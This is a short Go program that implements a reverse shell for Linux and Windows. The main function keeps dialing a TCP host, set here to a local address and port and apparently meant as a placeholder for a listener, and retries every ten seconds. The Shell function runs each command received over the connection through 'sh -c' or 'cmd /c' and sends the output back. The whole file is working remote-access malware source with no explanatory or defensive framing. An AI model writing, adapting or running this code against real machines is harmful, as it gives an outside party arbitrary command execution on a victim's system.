package main
import (
        "net"
        "os/exec"
        "bufio"
        "strings"
        "time"
	"runtime"
	"fmt"
)

func Shell(s net.Conn) bool {
	if runtime.GOOS == "linux" {
		for {
			msg,err := bufio.NewReader(s).ReadString('\n')
			if err != nil {
				break
			}
			out ,err := exec.Command("sh","-c",strings.TrimSuffix(msg, "\n")).Output()
			if err != nil {
				fmt.Fprintf(s,"%s\n",err)
			}
			fmt.Fprintf(s,"%s\n",out)
		}


	} else
	if runtime.GOOS == "windows" {
		for {
			msg,err := bufio.NewReader(s).ReadString('\n')
			if err != nil {
				break
			}
			out ,err := exec.Command("cmd","/c",strings.TrimSuffix(msg, "\n")).Output()
			if err != nil {
				fmt.Fprintf(s,"%s\n",err)
			}
			fmt.Fprintf(s,"%s\n",out)
		}

	}
	return false

}

func main() {
	var status bool
	host := "127.0.0.1:56337"
	time.Sleep(10 * time.Second)
	for {
		s,err := net.Dial("tcp",host)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		} else {

			status = Shell(s)
		}
		if status == false {
			continue
		}
        }
}

